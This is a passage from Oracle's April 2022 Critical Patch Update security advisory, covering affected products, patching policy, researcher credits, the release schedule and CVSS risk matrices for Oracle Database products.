| [Oracle Retail EFTLink, versions 17.0.2, 18.0.1, 19.0.1, 20.0.1, 21.0.0](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2855697.1) |
| [Oracle Retail Extract Transform and Load, version 13.2.8](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2855697.1) |
| [Oracle Retail Financial Integration, versions 14.1.3.2, 15.0.3.1, 16.0.1-16.0.3, 19.0.0, 19.0.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2855697.1) |
| [Oracle Retail Integration Bus, versions 14.1.3.2, 15.0.3.1, 16.0.1-16.0.3, 19.0.0, 19.0.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2855697.1) |
| [Oracle Retail Invoice Matching, version 16.0.3](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2855697.1) |
| [Oracle Retail Merchandising System, versions 16.0.3, 19.0.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2855697.1) |
| [Oracle Retail Service Backbone, versions 14.1.3.2, 15.0.3.1, 16.0.1-16.0.3, 19.0.0, 19.0.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2855697.1) |
| [Oracle Retail Store Inventory Management, versions 14.0.4.13, 14.1.3.5, 14.1.3.14, 15.0.3.3, 15.0.3.8, 16.0.3.7](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2855697.1) |
| [Oracle Retail Xstore Office Cloud Service, versions 16.0.6, 17.0.4, 18.0.3, 19.0.2, 20.0.1](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2855697.1) |
| [Oracle Retail Xstore Point of Service, versions 16.0.6, 17.0.4, 18.0.3, 19.0.2, 20.0.1, 21.0.0](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2855697.1) |
| [Oracle SD-WAN Edge, versions 9.0, 9.1](#AppendixCGBU) | [Oracle SD-WAN Edge](https://support.oracle.com/rs?type=doc&id=2863674.1) |
| [Oracle Secure Backup](#AppendixOSB) | [Oracle Secure Backup](https://support.oracle.com/rs?type=doc&id=2844795.1) |
| [Oracle Secure Global Desktop, version 5.6](#AppendixOVIR) | [Virtualization](https://support.oracle.com/rs?type=doc&id=2859130.1) |
| [Oracle Solaris, version 11](#AppendixSUNS) | [Systems](https://support.oracle.com/rs?type=doc&id=2857179.1) |
| [Oracle Solaris Cluster, version 4](#AppendixSUNS) | [Systems](https://support.oracle.com/rs?type=doc&id=2857179.1) |
| [Oracle SQL Developer, versions prior to 21.99](#AppendixSQLD) | [Database](https://support.oracle.com/rs?type=doc&id=2844795.1) |
| [Oracle StorageTek ACSLS, version 8.5.1](#AppendixSUNS) | [Systems](https://support.oracle.com/rs?type=doc&id=2857179.1) |
| [Oracle StorageTek Tape Analytics (STA), version 2.4](#AppendixSUNS) | [Systems](https://support.oracle.com/rs?type=doc&id=2857179.1) |
| [Oracle Taleo Platform, versions prior to 22.1](#AppendixTLEO) | [Oracle Taleo](https://support.oracle.com/rs?type=doc&id=2862405.1) |
| [Oracle Transportation Management, versions 6.4.3, 6.5.1](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/rs?type=doc&id=2858979.1) |
| [Oracle Tuxedo, version 12.2.2.0.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle Utilities Framework, versions 4.3.0.1.0-4.3.0.6.0, 4.4.0.0.0, 4.4.0.2.0, 4.4.0.3.0](#AppendixUTIL) | [Oracle Utilities Applications](https://support.oracle.com/rs?type=doc&id=2856383.1) |
| [Oracle VM VirtualBox, versions prior to 6.1.34](#AppendixOVIR) | [Virtualization](https://support.oracle.com/rs?type=doc&id=2859130.1) |
| [Oracle Web Services Manager, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle WebCenter Portal, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle WebCenter Sites, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle WebLogic Server, versions 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle ZFS Storage Appliance Kit, version 8.8](#AppendixSUNS) | [Systems](https://support.oracle.com/rs?type=doc&id=2857179.1) |
| [OSS Support Tools, versions 2.12.42, 18.3](#AppendixTOOL) | [Oracle Support Tools](https://support.oracle.com/rs?type=doc&id=2859097.1) |
| [PeopleSoft Enterprise CS Academic Advisement, version 9.2](#AppendixPS) | [PeopleSoft](https://support.oracle.com/rs?type=doc&id=2858976.1) |
| [PeopleSoft Enterprise FIN Cash Management, version 9.2](#AppendixPS) | [PeopleSoft](https://support.oracle.com/rs?type=doc&id=2858976.1) |
| [PeopleSoft Enterprise PeopleTools, versions 8.58, 8.59](#AppendixPS) | [PeopleSoft](https://support.oracle.com/rs?type=doc&id=2858976.1) |
| [PeopleSoft Enterprise PRTL Interaction Hub, version 9.1](#AppendixPS) | [PeopleSoft](https://support.oracle.com/rs?type=doc&id=2858976.1) |
| [Primavera Unifier, versions 17.7-17.12, 18.8, 19.12, 20.12, 21.12](#AppendixPVA) | [Oracle Construction and Engineering Suite](https://support.oracle.com/rs?type=doc&id=2856639.1) |

#### Note:

* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security patches detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpuapr2022verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

### Credit Statement

The following people or organizations reported security vulnerabilities addressed by this Critical Patch Update to Oracle:

* 4ra1n: CVE-2022-21441
* Adi Farshteindiker: CVE-2022-21487, CVE-2022-21488
* Ahmed Shah of Red Canari: CVE-2022-21481
* Alexander Kornbrust of Red Database Security: CVE-2022-21410
* AnhNH of Sacombank: CVE-2022-21419, CVE-2022-21448, CVE-2022-21492
* Anonymous researcher working with Trend Micro's Zero Day Initiative: CVE-2022-21482, CVE-2022-21490
* Anthony Weems: CVE-2022-21496
* Aobo Wang of Chaitin Security Research Lab: CVE-2022-21465, CVE-2022-21471
* bendtheory: CVE-2022-21468
* ChauUHM of Sacombank: CVE-2022-21419, CVE-2022-21448, CVE-2022-21492
* Cl0und of Syclover Security Team: CVE-2022-21420
* Dimitris Doganos of COSMOTE - Mobile Telecommunications S.A.: CVE-2022-21466
* Emad Al-Mousa: CVE-2022-21410
* Harrison Neal: CVE-2022-21411
* HolyBugx: CVE-2022-21468
* Iustin Ladunca (youstin): CVE-2022-21468
* Jangggg of VNPT: CVE-2022-21445, CVE-2022-21497
* Karan Lyons: CVE-2022-21496
* Kun Yang of Chaitin Security Research Lab: CVE-2022-21465, CVE-2022-21471
* lc working with Trend Micro Zero Day Initiative: CVE-2022-21483, CVE-2022-21484, CVE-2022-21489
* Liboheng of Tophant Starlight laboratory: CVE-2022-21420
* Lucas Leong (wmliang) of Trend Micro Zero Day Initiative: CVE-2022-21485, CVE-2022-21486
* Luo Likang of NSFocus Security Team: CVE-2022-21487
* Markus Loewe: CVE-2022-21443
* Michael MOSKOPP of Sogeti: CVE-2022-21469
* Natalia Trojanowska of SecuRing: CVE-2022-21467
* Neil Madden of ForgeRock: CVE-2022-21449
* Niels van Gijzen of HackDefense: CVE-2022-21470
* Oliver Bachtik of NVISO: CVE-2022-21491
* Omar Younis of Cysiv: CVE-2022-21477
* osword from SGLAB of Legendsec at Qi'anxin Group: CVE-2022-21434
* Paulino Calderon of websec mx: CVE-2022-21404
* peterjson - Security Engineering - VNG Corporation: CVE-2022-21445, CVE-2022-21497
* r00t4dm: CVE-2022-21421, CVE-2022-21441
* Sander Meijering of HackDefense: CVE-2022-21470
* Shihao Wen: CVE-2022-21438, CVE-2022-21459
* TuanNT of Sacombank: CVE-2022-21419, CVE-2022-21448, CVE-2022-21492
* TungHT of Sacombank: CVE-2022-21419, CVE-2022-21448, CVE-2022-21492
* Vikas Khanna: CVE-2022-21450
* wangze from Codesafe Team of Legendsec at Qi: CVE-2022-21453
* Yaoguang Chen of Ant Security Light-Year Lab: CVE-2021-2427

#### Security-In-Depth Contributors

Oracle acknowledges people who have contributed to our Security-In-Depth program (see [FAQ](/security-alerts/cpufaq.html)). People are acknowledged for Security-In-Depth contributions if they provide information, observations or suggestions pertaining to security vulnerability issues that result in significant modification of Oracle code or documentation in future releases, but are not of such a critical nature that they are distributed in Critical Patch Updates.

In this Critical Patch Update, Oracle recognizes the following for contributions to Oracle's Security-In-Depth program:

* Charles Korn
* John Jiang of Tencent.com
* thiscodecc of MoyunSec V-Lab
* Tugay Aslan of Beam Teknoloji

#### On-Line Presence Security Contributors

Oracle acknowledges people who have contributed to our On-Line Presence Security program (see [FAQ](/security-alerts/cpufaq.html)). People are acknowledged for contributions relating to Oracle's on-line presence if they provide information, observations or suggestions pertaining to security-related issues that result in significant modification to Oracle's on-line external-facing systems.

For this quarter, Oracle recognizes the following for contributions to Oracle's On-Line Presence Security program:

* Aakash Adhikari (dark\_haxor)
* Abdiwahab Ahmed
* Adarsh Sreedhar
* Ahmad Henry Mansour
* Ahmed Al-Saleem
* Aitor Herrero Fuentes
* Andrea NaD
* Anis Haboubi
* AR Movies A
* Fahad Anwar Hussain
* George Crook
* Hamoud Al-Helmani
* Het Vikam
* Houssem Belhadj Ahmed
* Hunt4r Bug
* J Jebarson Immanuel
* Joaquín Pochat
* Juhanák, Petr of Accenture
* Luca Ottoni
* Manjil Ghimire
* Marvi Alex
* Michoel Chaikin of Carsales.com Ltd
* Mohamed Veten of Resecurity, Inc.
* Mohamed Selem
* Mohammed Adam
* Mohammed Awez Kagdi
* Nagliy Kot
* Pankaj Kumar Thakur of Green Tick Nepal Pvt. Ltd.
* Pim Dieleman of Cadran Consultancy B.V. [2 reports]
* Prathamesh Bagul
* Rahul Singh
* Sagar Elias
* SEINT
* Shuvam Adhikari [4 reports]
* Tarun Garg
* Tejas Pagare
* Vikas Srivastava [2 reports]
* Vismit Sudhir Rakhecha (Druk)
* Vitali Lavrentikov

### Critical Patch Update Schedule

Critical Patch Updates are released on the third Tuesday of January, April, July, and October. The next four dates are:

* 19 July 2022
* 18 October 2022
* 17 January 2023
* 18 April 2023

### References

* [Oracle Critical Patch Updates, Security Alerts and Bulletins](https://www.oracle.com/security-alerts)
* [Critical Patch Update - April 2022 Documentation Map](https://support.oracle.com/rs?type=doc&id=2856042.1)
* [Oracle Critical Patch Updates and Security Alerts - Frequently Asked Questions](/security-alerts/cpufaq.html)
* [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)
* [Use of Common Vulnerability Scoring System (CVSS) by Oracle](/security-alerts/cvssscoringsystem.html)
* [English text version of the risk matrices](/security-alerts/cpuapr2022verbose.html)
* [CVRF XML version of the risk matrices](https://www.oracle.com/docs/tech/security-alerts/cpuapr2022cvrf.xml)
* [CSAF JSON version of the risk matrices](https://www.oracle.com/docs/tech/security-alerts/cpuapr2022csaf.json)
* [Map of CVE to Advisory/Alert](/security-alerts/public-vuln-to-advisory-mapping.html)
* [Oracle Lifetime support Policy](https://www.oracle.com/support/lifetime-support/resources.html)
* [JEP 290 Reference Blocklist Filter](https://support.oracle.com/rs?type=doc&id=2591118.1)

### Modification History

| Date | Note |
| --- | --- |
| 2024-December-23 | Rev 9. Updated the addtional CVE for ZFS CVE-2021-39275 |
| 2024-September-20 | Rev 8. Product Name and details changes for CVE-2022-21445. |
| 2022-June-16 | Rev 7. Added credit for CVE-2022-21438. |
| 2022-May-20 | Rev 6. Added version 8.5.6 to Outside In Technology. Changed the Component of Middleware Common Libraries and Tools to FMW Remote Diagnostic Agent for CVE-2021-30129. Updated credit name. |
| 2022-May-4 | Rev 5. Removed affected version 11.1.1.5.0 of Oracle Identity Manager Connector for CVE-2022-23305. Added a footnote for the change. |
| 2022-May-2 | Rev 4. Updated the affected versions Oracle Health Sciences InForm Publisher and Oracle Communications Unified Inventory Management. Note added for MySQL Enterprise Monitor. Note Removed for CVE-2022-21449. Credit Name Updated for CVE-2022-21453 |
| 2022-April-29 | Rev 3. Updated EM Ops Center additional CVEs for CVE-2021-40438. Updated Oracle ZFS additional CVEs for CVE-2021-39275 |
| 2022-April-21 | Rev 2. Updated the affected versions for CVE-2022-21449 |
| 2022-April-19 | Rev 1. Initial Release. |

#### Oracle Database Products Risk Matrices

This Critical Patch Update contains 29 new security patches for Oracle Database Products divided as follows:

* 5 new security patches for Oracle Database Products
* 1 new security patch for Oracle Autonomous Health Framework
* 15 new security patches for Oracle Blockchain Platform
* No new security patches for Oracle Global Lifecycle Management, but third party patches are provided
* 5 new security patches for Oracle GoldenGate
* No new security patches for Oracle NoSQL Database, but third party patches are provided
* 1 new security patch for Oracle REST Data Services
* No new security patches for Oracle Secure Backup, but third party patches are provided
* 2 new security patches for Oracle SQL Developer

#### Oracle Database Server Risk Matrix

This Critical Patch Update contains 5 new security patches plus additional third party patches noted below for Oracle Database Products.  None of these vulnerabilities may be remotely exploitable without authentication, i.e., none may be exploited over a network without requiring user credentials.  None of these patches are applicable to client-only installations, i.e., installations that do not have the Oracle Database Server installed. The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#DB)

| CVE# | Component | Package and/or Privilege Required | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-21410 | Oracle Database - Enterprise Edition Sharding | Create Any Procedure | Oracle Net | No | 7.2 | Network | Low | High | None | Un- changed | High | High | High | 19c |  |
| CVE-2022-21498 | Java VM | Create Procedure | Multiple | No | 6.5 | Network | Low | Low | None | Un- changed | None | High | None | 12.1.0.2, 19c, 21c |  |
| CVE-2021-41165 | Oracle Application Express (CKEditor) | Valid User Account | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | Prior to 22.1 |  |
| CVE-2022-21411 | RDBMS Gateway / Generic ODBC Connectivity | Create Session | Oracle Net | No | 5.4 | Network | Low | Low | None | Un- changed | Low | Low | None | 12.1.0.2, 19c, 21c |  |
| CVE-2021-22569 | Oracle Spatial and Graph MapViewer (protobuf-java) | Local Logon | Local Logon | No | 2.8 | Local | Low | Low | Required | Un- changed | None | None | Low | 19c, 21c |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-41165 also addresses CVE-2021-41164.

#### Additional patches are included in this Critical Patch Update for the following non-exploitable CVEs in this Oracle product family:

* Oracle Database - Enterprise Edition Portable Clusterware (Apache MINA SSHD): CVE-2021-30129.
* Oracle Database - Enterprise Edition RDBMS (LibExpat): CVE-2022-23990 and CVE-2022-23852.
* Oracle Database Configuration Assistant (Apache Commons Compress): CVE-2019-12402.
* Oracle Database Enterprise Edition (Apache Tomcat): CVE-2021-42340.

#### Oracle Autonomous Health Framework Risk Matrix

This Critical Patch Update contains 1 new security patch for Oracle Autonomous Health Framework.  This vulnerability is not remotely exploitable without authentication, i.e., may not be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#AHTF)

| CVE# | Component | Package and/or Privilege Required | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2464 | Engineered Systems Utilities | Local Logon | Local Logon | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 12.1.0.2, 19c, 21c |  |

#### Oracle Blockchain Platform Risk Matrix

This Critical Patch Update contains 15 new security patches for Oracle Blockchain Platform.  14 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#BP)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-23017 | Oracle Blockchain Platform | Backend (nginx) | UDP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | Prior to 21.1.2 |  |
| CVE-2020-5245 | Oracle Blockchain Platform | Backend (Dropwizard-Validation) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | Prior to 21.1.2 |  |
| CVE-2021-2351 | Oracle Blockchain Platform | BCS Console (JDBC, OCCI) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 21.1.2 | See Note 1 |
| CVE-2020-8174 | Oracle Blockchain Platform | BCS Console (Node.js) | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | Prior to 21.1.2 |  |
| CVE-2020-24750 | Oracle Blockchain Platform | BCS Console (jackson-databind) | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | Prior to 21.1.2 |  |
| CVE-2020-28052 | Oracle Blockchain Platform | BCS Console (Bouncy Castle Java Library) | HTTPS | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | Prior to 21.1.2 |  |
| CVE-2019-12399 | Oracle Blockchain Platform | BCS Console (Apache Kafka) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | Prior to 21.1.2 |  |
| CVE-2020-17527 | Oracle Blockchain Platform | BCS Console (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | Prior to 21.1.2 |  |
| CVE-2020-11612 | Oracle Blockchain Platform | BCS Console (Netty) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | Prior to 21.1.2 |  |
| CVE-2019-13565 | Oracle Blockchain Platform | Backend (OpenLDAP) | LDAP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | Prior to 21.1.2 |  |
| CVE-2020-8203 | Oracle Blockchain Platform | BCS Console (Lodash) | HTTP | Yes | 7.4 | Network | High | None | None | Un- changed | None | High | High | Prior to 21.1.2 |  |
| CVE-2019-10086 | Oracle Blockchain Platform | BCS Console (Apache Commons BeanUtils) | HTTP | Yes | 7.3 | Network | Low | None | None | Un- changed | Low | Low | Low | Prior to 21.1.2 |  |
| CVE-2020-11022 | Oracle Blockchain Platform | Backend (jQuery) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | Prior to 21.1.2 |  |
| CVE-2021-29425 | Oracle Blockchain Platform | BCS Console (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | Prior to 21.1.2 |  |
| CVE-2020-27218 | Oracle Blockchain Platform | BCS Console (Eclipse Jetty) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | None | Low | Low | Prior to 21.1.2 |  |

#### Notes:

1. This is a hotfix on top of version 21.1.2

#### Additional CVEs addressed are:

* The patch for CVE-2019-13565 also addresses CVE-2017-14159, CVE-2017-17740, CVE-2017-9287, CVE-2019-13057, CVE-2020-12243, and CVE-2020-15719.
* The patch for CVE-2020-17527 also addresses CVE-2020-13935.
* The patch for CVE-2020-24750 also addresses CVE-2020-24616, CVE-2020-25649, and CVE-2020-36189.
* The patch for CVE-2020-8174 also addresses CVE-2020-10531, CVE-2020-11080, CVE-2020-8172, and CVE-2020-8277.

#### Oracle Global Lifecycle Management Risk Matrix

This Critical Patch Update contains no new security patches but does include third party patches noted below for Oracle Global Lifecycle Management.  Please refer to previous Critical Patch Update Advisories if the last Critical Patch Update was not applied for Oracle Global Lifecycle Management.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#GLM)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| There are no exploitable vulnerabilities for these products. Third party patches for non-exploitable CVEs are noted below. | | | | | | | | | | | | | | | |

#### Additional patches are included in this Critical Patch Update for the following non-exploitable CVEs in this Oracle product family:

* Oracle Global Lifecycle Management OPatch
  + Centralized Third Party Jars (Apache Commons Compress): CVE-2021-36090, CVE-2021-35515, CVE-2021-35516 and CVE-2021-35517.

#### Oracle GoldenGate Risk Matrix

This Critical Patch Update contains 5 new security patches plus additional third party patches noted below for Oracle GoldenGate.  4 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#GG)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-26291 | Oracle GoldenGate Big Data and Application Adapters | General (Apache Maven) | HTTP | Yes | 9.1 | Network | Low | None | None | Un- changed | High | High | None | Prior to 23.1 |  |
| CVE-2022-21442 | Oracle GoldenGate | OGG Core Library | None | No | 8.8 | Local | Low | Low | None | Changed | High | High | High | Prior to 23.1 |  |
| CVE-2021-2351 | Oracle GoldenGate Application Adapters | General (OCCI) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | Prior to 23.1 |  |
| CVE-2019-12086 | Oracle GoldenGate | Internal Framework (jackson-databind) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | Prior to 12.3.0.1.2 |  |
| CVE-2019-14862 | Oracle GoldenGate | Internal Framework (Knockout) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | Prior to 12.3.0.1.2 |  |

#### Additional patches are included in this Critical Patch Update for the following non-exploitable CVEs in this Oracle product family:

* Oracle GoldenGate Application Adapters
  + General (Apache Log4j): CVE-2022-23305, CVE-2019-17571, CVE-2021-4104 and CVE-2022-23302.

#### Oracle NoSQL Database Risk Matrix

This Critical Patch Update contains no new security patches but does include third party patches noted below for Oracle NoSQL Database.  Please refer to previous Critical Patch Update Advisories if the last Critical Patch Update was not applied for Oracle NoSQL Database.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#NSQL)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| There are no exploitable vulnerabilities for these products. Third party patches for non-exploitable CVEs are noted below. | | | | | | | | | | | | | | | |

#### Additional patches are included in this Critical Patch Update for the following non-exploitable CVEs in this Oracle product family:

* Oracle NoSQL Database
  + Administration (Netty): CVE-2021-37137, CVE-2021-21290, CVE-2021-21295, CVE-2021-21409, CVE-2021-30129 and CVE-2021-37136.
  + Administration (Apache MINA SSHD): CVE-2021-30129.

#### Oracle REST Data Services Risk Matrix

This Critical Patch Update contains 1 new security patch for Oracle REST Data Services.  This vulnerability is not remotely exploitable without authentication, i.e., may not be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#REST)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-29425 | Oracle REST Data Services | General (Apache Commons IO) | HTTP | No | 4.2 | Network | High | Low | None | Un- changed | Low | Low | None | Prior to 21.2 |  |

#### Oracle Secure Backup Risk Matrix

This Critical Patch Update contains no new security patches but does include third party patches noted below for Oracle Secure Backup.  Please refer to previous Critical Patch Update Advisories if the last Critical Patch Update was not applied for Oracle Secure Backup.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#OSB)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
